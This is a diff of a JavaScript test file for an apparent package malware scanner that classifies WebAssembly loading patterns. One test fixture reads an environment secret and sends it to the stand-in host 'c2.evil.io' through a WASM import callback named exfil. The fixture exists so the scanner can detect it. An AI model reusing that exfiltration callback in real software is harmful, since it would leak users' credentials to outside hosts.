@@ -1397,7 +1397,32 @@ new Worker('./worker.js');
   });
   // ===== WASM Host Sink Detection (AST-036) =====
 
-  asyncTest('AST: WebAssembly.compile + https.request → wasm_host_sink CRITICAL', async () => {
+  asyncTest('AST: WebAssembly.compile + fetch (WASM loading pattern) → wasm_standalone MEDIUM', async () => {
+    const tmp = makeTempPkg(`
+async function initWasm() {
+  // Standard WASM loading pattern: fetch() is used to load the .wasm file
+  const response = await fetch('core.wasm');
+  const wasmModule = await WebAssembly.compileStreaming(response);
+  const instance = await WebAssembly.instantiate(wasmModule, {
+    env: { memory: new WebAssembly.Memory({ initial: 1 }) }
+  });
+  return instance.exports.compute(42);
+}
+initWasm();
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      // C5+C6: WASM + fetch-only (no https.request/http.get) → wasm_standalone MEDIUM
+      // because fetch() is the standard way to load WASM modules
+      const t = result.threats.find(t => t.type === 'wasm_standalone');
+      assert(t, 'Should detect wasm_standalone');
+      assert(t.severity === 'MEDIUM', `Severity should be MEDIUM, got ${t.severity}`);
+      const hostSink = result.threats.find(t => t.type === 'wasm_host_sink');
+      assert(!hostSink, 'Should NOT trigger wasm_host_sink for fetch-based WASM loading');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  asyncTest('AST: WebAssembly.compile + https.request (non-fetch network) → wasm_host_sink CRITICAL', async () => {
     const tmp = makeTempPkg(`
 const fs = require('fs');
 const path = require('path');
@@ -1419,9 +1444,11 @@ initWasm();
 `);
     try {
       const result = await runScanDirect(tmp);
+      // C5: https.request is NOT a WASM loading call — it indicates an independent network channel
+      // WASM + independent network → wasm_host_sink CRITICAL (C2 pattern)
       const t = result.threats.find(t => t.type === 'wasm_host_sink');
-      assert(t, 'Should detect wasm_host_sink');
-      assert(t.severity === 'CRITICAL', 'Severity should be CRITICAL');
+      assert(t, 'Should detect wasm_host_sink with non-fetch network');
+      assert(t.severity === 'CRITICAL', `Severity should be CRITICAL, got ${t.severity}`);
     } finally { cleanupTemp(tmp); }
   });
 
@@ -1469,17 +1496,44 @@ module.exports = loadCrypto;
     } finally { cleanupTemp(tmp); }
   });
 
-  asyncTest('AST: WebAssembly.compile + https.request → wasm_host_sink CRITICAL, NOT wasm_standalone', async () => {
+  asyncTest('AST: WebAssembly.compile + fetch only → wasm_standalone MEDIUM, NOT wasm_host_sink', async () => {
+    const tmp = makeTempPkg(`
+async function init() {
+  const response = await fetch('payload.wasm');
+  const buf = await response.arrayBuffer();
+  const mod = await WebAssembly.compile(buf);
+  const instance = await WebAssembly.instantiate(mod, {
+    env: { memory: new WebAssembly.Memory({ initial: 1 }) }
+  });
+  return instance.exports.process();
+}
+init();
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      // C5+C6: WASM + fetch-only → wasm_standalone MEDIUM (fetch is for WASM loading)
+      const standalone = result.threats.find(t => t.type === 'wasm_standalone');
+      assert(standalone, 'Should detect wasm_standalone');
+      assert(standalone.severity === 'MEDIUM', `wasm_standalone should be MEDIUM, got ${standalone.severity}`);
+      const hostSink = result.threats.find(t => t.type === 'wasm_host_sink');
+      assert(!hostSink, 'Should NOT trigger wasm_host_sink for fetch-based WASM loading');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  asyncTest('AST: WebAssembly.compile + https.request + process.env → wasm_host_sink CRITICAL', async () => {
     const tmp = makeTempPkg(`
 const fs = require('fs');
+const https = require('https');
 async function init() {
+  const secret = process.env.SECRET_KEY;
   const buf = fs.readFileSync('payload.wasm');
   const mod = await WebAssembly.compile(buf);
   const instance = await WebAssembly.instantiate(mod, {
     env: {
       exfil: (ptr, len) => {
-        const https = require('https');
-        https.request({ hostname: 'evil.io' }).end();
+        const req = https.request({ hostname: 'c2.evil.io', method: 'POST', headers: { 'X-Key': secret } });
+        req.write(secret);
+        req.end();
       }
     }
   });
@@ -1488,11 +1542,12 @@ init();
 `);
     try {
       const result = await runScanDirect(tmp);
+      // C5+C6: WASM + network + env_access corroborating signal → wasm_host_sink CRITICAL
       const hostSink = result.threats.find(t => t.type === 'wasm_host_sink');
-      assert(hostSink, 'Should detect wasm_host_sink');
-      assert(hostSink.severity === 'CRITICAL', 'wasm_host_sink should be CRITICAL');
+      assert(hostSink, 'Should detect wasm_host_sink when env_access signal is present');
+      assert(hostSink.severity === 'CRITICAL', `wasm_host_sink should be CRITICAL, got ${hostSink.severity}`);
       const standalone = result.threats.find(t => t.type === 'wasm_standalone');
-      assert(!standalone, 'Should NOT trigger wasm_standalone when network is present');
+      assert(!standalone, 'Should NOT trigger wasm_standalone when wasm_host_sink is emitted');
     } finally { cleanupTemp(tmp); }
   });
 
